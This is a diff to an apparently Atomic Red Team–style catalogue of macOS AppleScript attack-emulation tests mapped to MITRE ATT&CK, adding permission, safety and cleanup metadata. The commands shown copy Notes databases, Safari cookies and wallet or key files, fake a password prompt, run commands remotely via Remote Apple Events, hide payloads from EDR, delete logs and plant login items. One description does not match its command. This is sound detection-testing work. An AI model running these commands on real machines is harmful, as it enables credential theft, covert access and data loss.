@@ -4,7 +4,14 @@
     "command": "tell application \"Finder\"\n  set destinationFolderPath to POSIX file \"#{destination_path}\"\n  set notesFolderPath to (path to home folder as text) & \"Library:Group Containers:group.com.apple.notes:\"\n  set notesFolder to folder notesFolderPath\n  set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\", file \"NoteStore.sqlite-wal\"} of notesFolder\n  repeat with aFile in notesFiles\n    duplicate aFile to folder destinationFolderPath with replacing\n  end repeat\nend tell\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "This command will copy Apple Notes database files using AppleScript as seen in Atomic Stealer.",
     "technique_id": "T1005",
     "technique_name": "Data from Local System",
@@ -15,7 +22,15 @@
     "command": "tell application \"System Events\" to get name of every process whose background only is false",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Accessibility"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "This test uses System Events to find all running applications that currently have a window.",
     "technique_id": "T1010",
     "technique_name": "Application Window Discovery",
@@ -26,7 +41,14 @@
     "command": "tell application \"Safari\"\n  try\n      activate\n      -- Open the URL in a new tab\n      tell window 1\n          set current tab to (make new tab with properties {URL:\"#{testURL}\"})\n      end tell\n\n      -- Wait for page to load\n      delay 3\n\n      -- Check if page loaded successfully by checking the URL or title\n      set currentURL to URL of current tab of window 1\n      set pageTitle to name of current tab of window 1\n\n      -- Close the test tab\n      close current tab of window 1\n\n      -- Check if we got a valid result\n      if currentURL contains \"#{testURL}\" and pageTitle does not contain \"can't\" and pageTitle does not contain \"error\" then\n        set connectionResult to true\n      else\n        set connectionResult to false\n      end if\n\n  on error\n    set connectionResult to false\n  end try\n\n  try\n    quit\n  end try\n  return connectionResult\nend tell",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Adversaries may check for Internet connectivity on compromised systems.",
     "technique_id": "T1016.001",
     "technique_name": "System Network Configuration Discovery: Internet Connection Discovery",
@@ -37,7 +59,12 @@
     "command": "read POSIX file \"/etc/hosts\"",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Adversaries may analyze data from local host file (/etc/hosts)",
     "technique_id": "T1018",
     "technique_name": "Remote System Discovery",
@@ -48,7 +75,12 @@
     "command": "mount volume \"smb://#{username}:#{password}@#{target}/#{shareName}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Mount a remote SMB share using AppleScript's mount volume command. This bypasses the authentication error and GUI configuration step required when using the mount command-line utility, providing immediate filesystem-level access to the remote share.",
     "technique_id": "T1021.002",
     "technique_name": "Remote Services: SMB/Windows Admin Shares",
@@ -59,7 +91,12 @@
     "command": "tell application \"Finder\" of machine \"eppc://#{target}\"\n  get name of every disk\nend tell\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Remotely query the Finder for a list of mounted volumes on a target machine using Remote Apple Events (RAE) via the eppc:// protocol. Actions performed via Apple Events bypass security telemetry focused on process execution trees, making RAE a discreet lateral movement vector.",
     "technique_id": "T1021.005",
     "technique_name": "Remote Services: Remote Apple Events",
@@ -70,7 +107,12 @@
     "command": "tell application \"Terminal\" of machine \"eppc://#{target}\"\n  do script \"#{command}\"\nend tell\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Use Terminal.app as a remote execution proxy via Remote Apple Events (RAE) to bypass the -10016 Handler Error that prevents System Events from executing shell commands remotely. Terminal.app accepts do script commands over the eppc:// protocol and is designed for shell interaction.",
     "technique_id": "T1021.005",
     "technique_name": "Remote Services: Remote Apple Events",
@@ -81,7 +123,12 @@
     "command": "tell application \"Finder\" of machine \"eppc://#{target}\"\n  set comment of (make new file at desktop with properties {name:\"#{filename}\"}) to \"#{encodedPayload}\"\nend tell\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Stage a Base64-encoded payload in the Finder comment (kMDItemFinderComment) of a newly created file on a remote machine via Remote Apple Events (RAE). Because the payload resides in Spotlight metadata rather than the file's data fork, it evades file-based EDR scanning of the target's filesystem.",
     "technique_id": "T1021.005",
     "technique_name": "Remote Services: Remote Apple Events",
@@ -92,7 +139,19 @@
     "command": "tell application \"Finder\" to set comment of (POSIX file \"#{filePath}\" as alias) to \"#{encodedPayload}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [
+      {
+        "description": "Clear the Finder comment written by the test.",
+        "command": "tell application \"Finder\" to set comment of (POSIX file \"#{filePath}\" as alias) to \"\"\n"
+      }
+    ],
     "description": "Store a Base64-encoded payload in the Finder comment (kMDItemFinderComment) Spotlight metadata field of a file. The payload resides outside the file's data fork, bypassing file-based security scanners and static analysis tools that focus on executable code and script contents.",
     "technique_id": "T1027",
     "technique_name": "Obfuscated Files or Information",
@@ -103,7 +162,12 @@
     "command": "short user name of (system info)\nlong user name of (system info)\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves the current user's short and long names using the system info command.",
     "technique_id": "T1033",
     "technique_name": "System Owner/User Discovery",
@@ -114,7 +178,12 @@
     "command": "system attribute \"USER\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves the current user's username using the USER environment variable.",
     "technique_id": "T1033",
     "technique_name": "System Owner/User Discovery",
@@ -125,7 +194,12 @@
     "command": "list folder \"/Users\"",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "By default, the user's home directory is /Users/username.\nListing the /Users folder will return the list of users on the system.\n",
     "technique_id": "T1033",
     "technique_name": "System Owner/User Discovery",
@@ -136,7 +210,15 @@
     "command": "const app = Application(\"System Events\")\nconst user = app.currentUser();\nconst longName = user.fullName();\nconst shortName = user.name();\nconst userHome = user.homeDirectory();\n\n`Name: ${longName}\nUsername: ${shortName}\nHome Directory: ${userHome}`",
     "language": "JavaScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Accessibility"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves the current user's username using the System Events JXA command.",
     "technique_id": "T1033",
     "technique_name": "System Owner/User Discovery",
@@ -147,7 +229,12 @@
     "command": "display dialog \"#{description}\" with title \"#{title}\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" with hidden answer\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Removes a specified login item from the user's login items list. This can be used to clean up persistence mechanisms or remove unwanted autostart entries.",
     "technique_id": "T1056.002",
     "technique_name": "Input Capture: GUI Input Capture",
@@ -158,7 +245,15 @@
     "command": "tell application \"System Events\" to get name of every process\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Accessibility"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves a list of all running processes on the system using System Events. This provides comprehensive process enumeration capabilities and may require TCC approval for System Events access.",
     "technique_id": "T1057",
     "technique_name": "Process Discovery",
@@ -169,7 +264,15 @@
     "command": "tell application \"System Events\"\n  set runningApps to name of every application process\n  repeat with appName in runningApps\n    log appName\n  end repeat\nend tell",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Accessibility"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves only user-facing application processes (excluding system processes and daemons). This focuses on applications that users typically interact with and may require TCC approval for System Events access.",
     "technique_id": "T1057",
     "technique_name": "Process Discovery",
@@ -180,7 +283,14 @@
     "command": "use framework \"AppKit\"\nuse framework \"Foundation\"\n\nset r to {}\nset activeApps to current application's NSWorkspace's sharedWorkspace's runningApplications()\nrepeat with anApp in activeApps\n    try\n        set this_app to anApp's localizedName() as text\n        if this_app is not missing value and this_app is not \"\" then\n            set end of r to this_app\n        end if\n    on error\n        -- Skip apps without names\n    end try\nend repeat\nreturn r",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves running applications using AppKit framework.",
     "technique_id": "T1057",
     "technique_name": "Process Discovery",
@@ -191,7 +301,14 @@
     "command": "tell application \"#{applicationName}\" to activate\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Opens an application on the system. The application will be in focus after running the command.",
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
@@ -202,7 +319,14 @@
     "command": "tell application \"#{applicationName}\" to launch\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Lauches an application on the system. The application will be in the background after running the command.",
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
@@ -213,7 +337,14 @@
     "command": "tell application \"#{applicationName}\" to close windows\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Closes an application on the system.",
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
@@ -224,7 +355,12 @@
     "command": "set volume with output muted",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Mutes the volume on the system.",
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
@@ -235,7 +371,12 @@
     "command": "do shell script \"#{bashCommand}\"",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Adversaries use the Unix shell to execute commands and scripts.",
     "technique_id": "T1059.004",
     "technique_name": "Command and Scripting Interpreter: Unix Shell",
@@ -246,7 +387,14 @@
     "command": "do shell script \"#{bashCommand}\" with administrator privileges",
     "language": "AppleScript",
     "elevation_required": true,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Adversaries use the Unix shell to execute commands and scripts.",
     "technique_id": "T1059.004",
     "technique_name": "Command and Scripting Interpreter: Unix Shell",
@@ -257,7 +405,19 @@
     "command": "tell application \"Terminal\"\n  do script \"#{bashCommand}\"\n  delay 3\n  try\n    quit\n  end try\nend tell\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [
+      {
+        "description": "Close Terminal window created by the test.",
+        "command": "tell application \"Terminal\" to quit"
+      }
+    ],
     "description": "Use Terminal.app as an execution proxy for shell commands via AppleScript. Unlike System Events, Terminal.app accepts do script commands and is designed for shell interaction, enabling shell execution through Apple Events IPC.",
     "technique_id": "T1059.004",
     "technique_name": "Command and Scripting Interpreter: Unix Shell",
@@ -268,7 +428,14 @@
     "command": "tell application \"Finder\" to delete POSIX file \"#{logPath}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": true,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "This test deletes the system log file using Finder application.",
     "technique_id": "T1070.002",
     "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
@@ -279,7 +446,14 @@
     "command": "tell application \"System Events\" to delete login item \"#{loginItemName}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": true,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Removes a specified login item from the user's login items list. This can be used to clean up persistence mechanisms or remove unwanted autostart entries.",
     "technique_id": "T1070.009",
     "technique_name": "Indicator Removal: Clear Persistence",
@@ -290,7 +464,12 @@
     "command": "system info\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves comprehensive system information including OS version, hardware details, and system configuration using the system info command. This provides detailed system reconnaissance capabilities without requiring elevated privileges.",
     "technique_id": "T1082",
     "technique_name": "System Information Discovery",
@@ -301,7 +480,12 @@
     "command": "list disks",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Lists all connected disks on the system using the list disks command.",
     "technique_id": "T1082",
     "technique_name": "System Information Discovery",
@@ -312,7 +496,12 @@
     "command": "do shell script \"system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType\"",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves hardware, software, and display information by invoking system_profiler through AppleScript.",
     "technique_id": "T1082",
     "technique_name": "System Information Discovery",
@@ -323,7 +512,12 @@
     "command": "set fileGrabberFolderPath to \"#{destinationPath}\"\nset extensionsList to {\"txt\", \"docx\", \"rtf\", \"doc\", \"wallet\", \"keys\", \"key\", \"env\", \"md\", \"kdbx\"}\n\ntry\n \tset desktopFiles to every file of desktop\n \trepeat with aFile in desktopFiles\n  \t\ttry\n \t\t\t  set fileExtension to name extension of aFile\n   \t\t\tif fileExtension is in extensionsList then\n  \t\t\t\tset fileSize to size of aFile\n  \t\t\t\tif fileSize < 51200 then\n   \t\t\t\t\tset destinationFolder to (POSIX file fileGrabberFolderPath) as alias\n   \t\t\t\t\tduplicate aFile to destinationFolder with replacing\n  \t\t\t\tend if\n   \t\t\tend if\n  \t\tend try\n \tend repeat\nend try\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "FileGrabber grabs files from desktop and copies them to a temporary folder",
     "technique_id": "T1083",
     "technique_name": "File and Directory Discovery",
@@ -334,7 +528,14 @@
     "command": "tell application \"Finder\" to get name of every item of folder POSIX file \"#{folderName}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Enumerate files and directories in the root filesystem using Finder application via AppleScript",
     "technique_id": "T1083",
     "technique_name": "File and Directory Discovery",
@@ -345,7 +546,12 @@
     "command": "list folder \"#{folderName}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Perform directory listing of root filesystem using AppleScript list folder command",
     "technique_id": "T1083",
     "technique_name": "File and Directory Discovery",
@@ -356,7 +562,15 @@
     "command": "tell application \"System Events\" to get name of every user",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Accessibility"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Adversaries may attempt to get a listing of local system accounts.",
     "technique_id": "T1087.001",
     "technique_name": "Account Discovery: Local Account",
@@ -367,7 +581,16 @@
     "command": "tell application \"System Events\" to key code 20 using {command down, shift down}",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Accessibility",
+      "Screen Recording"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Capture screenshot using System Events",
     "technique_id": "T1113",
     "technique_name": "Input Capture",
@@ -378,7 +601,14 @@
     "command": "tell application \"System Events\" to get the clipboard",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves the current clipboard content using System Events.",
     "technique_id": "T1115",
     "technique_name": "Clipboard Data",
@@ -389,7 +619,14 @@
     "command": "tell application \"System Events\" to set the clipboard to \"#{clipboardContent}\"",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Sets the clipboard content to a specified value using System Events.",
     "technique_id": "T1115",
     "technique_name": "Clipboard Data",
@@ -400,7 +637,12 @@
     "command": "the clipboard",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves the current clipboard content using AppleScript's built-in clipboard command.",
     "technique_id": "T1115",
     "technique_name": "Clipboard Data",
@@ -411,7 +653,12 @@
     "command": "set the clipboard to \"#{textContent}\"",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Sets the clipboard content to a specified value using AppleScript's built-in clipboard command.",
     "technique_id": "T1115",
     "technique_name": "Clipboard Data",
@@ -422,7 +669,12 @@
     "command": "use framework \"Foundation\"\nuse framework \"AppKit\"\n\nset pasteboard to current application's NSPasteboard's generalPasteboard()\nset clipboardContent to pasteboard's stringForType:\"public.utf8-plain-text\"\nclipboardContent\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Retrieves clipboard content using Cocoa frameworks (Foundation and AppKit).",
     "technique_id": "T1115",
     "technique_name": "Clipboard Data",
@@ -433,7 +685,12 @@
     "command": "use framework \"Foundation\"\nuse framework \"AppKit\"\n\nset pasteboard to current application's NSPasteboard's generalPasteboard()\npasteboard's setString:\"#{textContent}\" forType:\"public.utf8-plain-text\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Sets clipboard content using Cocoa frameworks (Foundation and AppKit).",
     "technique_id": "T1115",
     "technique_name": "Clipboard Data",
@@ -444,7 +701,15 @@
     "command": "tell application \"System Events\" to get name of every disk whose ejectable is true\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Accessibility"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "This test uses System Events to find all connected removable storage devices.",
     "technique_id": "T1120",
     "technique_name": "Peripheral Device Discovery",
@@ -455,7 +720,14 @@
     "command": "tell application \"Finder\" to get name of every disk whose ejectable is true\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "This test uses Finder to find all connected removable storage devices.",
     "technique_id": "T1120",
     "technique_name": "Peripheral Device Discovery",
@@ -466,7 +738,14 @@
     "command": "tell application \"System Information\" to get properties",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "This test uses System Information to find all connected devices (bluetooth, wifi, disks, application versions, etc.).",
     "technique_id": "T1120",
     "technique_name": "Peripheral Device Discovery",
@@ -477,7 +756,20 @@
     "command": "tell application \"QuickTime Player\"\n \tactivate\n \tnew audio recording\n \tdelay 2\n \ttell front document\n\t\tstart\n\t\tdelay \"#{recordingTime}\"\n\t\tstop\n \tend tell\n \texport front document in (POSIX file \"#{filePath}\") using settings preset \"Audio Only\"\n \tquit saving no\nend tell",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation",
+      "Microphone"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [
+      {
+        "description": "Remove the audio recording created by the test.",
+        "command": "do shell script \"rm -f #{filePath}\"\n"
+      }
+    ],
     "description": "Capture audio using QuickTime Player",
     "technique_id": "T1123",
     "technique_name": "Audio Capture",
@@ -488,7 +780,12 @@
     "command": "current date",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "An adversary may gather the system time and/or time zone settings from a local or remote system.",
     "technique_id": "T1124",
     "technique_name": "System Time Discovery",
@@ -499,7 +796,12 @@
     "command": "tell application \"safari\"\n  set curURL to URL in front document\n  return curURL\nend tell",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Adversaries use osascript to gather information about the victim's browsing habits and preferences.",
     "technique_id": "T1217",
     "technique_name": "Browser Information Discovery",
@@ -510,7 +812,14 @@
     "command": "tell application \"#{applicationName}\" to quit",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users.",
     "technique_id": "T1489",
     "technique_name": "Service Stop",
@@ -521,7 +830,12 @@
     "command": "set pidList to do shell script \"ps ax | grep \" & quoted form of \"#{processName}\" & \" | grep -v grep | awk '{print $1}'\"\nrepeat with pid in paragraphs of pidList\n  if pid is not \"\" then\n    do shell script \"kill -9 \" & pid\n  end if\nend repeat",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": true,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Finds processes by name and terminates matching PIDs via AppleScript's do shell script command, as seen in macOS.OSAMiner anti-analysis behavior.",
     "technique_id": "T1489",
     "technique_name": "Service Stop",
@@ -532,7 +846,12 @@
     "command": "tell application \"System Events\" to tell every desktop to set picture to \"#{filePath}\"\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Adveraries use osascript to change the device wallpaper.",
     "technique_id": "T1491.001",
     "technique_name": "Defacement: Internal Defacement",
@@ -543,7 +862,12 @@
     "command": "set memData to do shell script \"system_profiler SPMemoryDataType\"\nif memData contains \"QEMU\" or memData contains \"VMware\" then\n  return \"Virtualization artifact detected\"\nelse\n  return \"No virtualization artifacts detected\"\nend if\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Checks system memory profiler output for virtualization artifacts through AppleScript's do shell script command.",
     "technique_id": "T1497",
     "technique_name": "Virtualization/Sandbox Evasion",
@@ -554,7 +878,12 @@
     "command": "set hardwareData to do shell script \"system_profiler SPHardwareDataType\"\nignoring case\n  if hardwareData contains \"vmware\" or hardwareData contains \"virtualbox\" or hardwareData contains \"parallels\" or hardwareData contains \"qemu\" then\n    return \"Virtualization artifact detected\"\n  else\n    return \"No virtualization artifacts detected\"\n  end if\nend ignoring",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "Checks hardware profiler output for common virtual machine indicators using AppleScript.",
     "technique_id": "T1497",
     "technique_name": "Virtualization/Sandbox Evasion",
@@ -565,7 +894,12 @@
     "command": "use framework \"Foundation\"\nset plistPath to \"/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Info.plist\"\nset plistURL to current application's NSURL's fileURLWithPath:plistPath\nset plistDict to current application's NSDictionary's dictionaryWithContentsOfURL:plistURL\nset bundleVersion to plistDict's objectForKey:\"CFBundleShortVersionString\"\nreturn bundleVersion as string",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": false,
+    "tcc_required": [],
+    "safety": {
+      "destructive": false,
+      "modifies_system": false
+    },
+    "cleanup": [],
     "description": "This test checks the version of XProtect, the built-in antivirus in macOS. XCSSET checks whether the version of XProtect is less than 5287.",
     "technique_id": "T1518.001",
     "technique_name": "Security Software Discovery",
@@ -576,7 +910,14 @@
     "command": "tell application \"System Events\" to shutdown",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": true,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Shuts down the system using the shutdown command from System Events.",
     "technique_id": "T1529",
     "technique_name": "System Shutdown/Reboot",
@@ -587,7 +928,14 @@
     "command": "tell application \"System Events\" to reboot",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": true,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Reboots the system using the reboot command from System Events.",
     "technique_id": "T1529",
     "technique_name": "System Shutdown/Reboot",
@@ -598,7 +946,14 @@
     "command": "tell application \"Finder\" to sleep",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "Puts the system to sleep through Finder using AppleScript, matching EggShell tradecraft reported in the wild.",
     "technique_id": "T1529",
     "technique_name": "System Shutdown/Reboot",
@@ -609,7 +964,14 @@
     "command": "tell application \"Finder\"\n  set destinationFolderPath to POSIX file \"#{destination_path}\"\n  set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")\n  duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing\nend tell\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [],
     "description": "This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.",
     "technique_id": "T1539",
     "technique_name": "Steal Web Session Cookie",
@@ -620,7 +982,19 @@
     "command": "tell application \"System Events\" to make login item at end with properties {path:\"#{itemPath}\", hidden:\"#{isHidden}\"}\n",
     "language": "AppleScript",
     "elevation_required": false,
-    "tcc_required": true,
+    "tcc_required": [
+      "Automation"
+    ],
+    "safety": {
+      "destructive": false,
+      "modifies_system": true
+    },
+    "cleanup": [
+      {
+        "description": "Remove the login item created by the test.",
+        "command": "tell application \"System Events\" to delete login item \"Calculator\""
+      }
+    ],
     "description": "Creates a new login item that will automatically start when the user logs in.",
     "technique_id": "T1547.015",
     "technique_name": "Boot or Logon Autostart Execution: Login Items",
@@ -631,7 +1005,14 @@
     "command": "tell application \"System Events\" to get name of every login item\ntell application \"System Events\" to get the hidden of every login item\ntell application \"System Events\" to get the path of every login item",
     "language": "AppleScript",
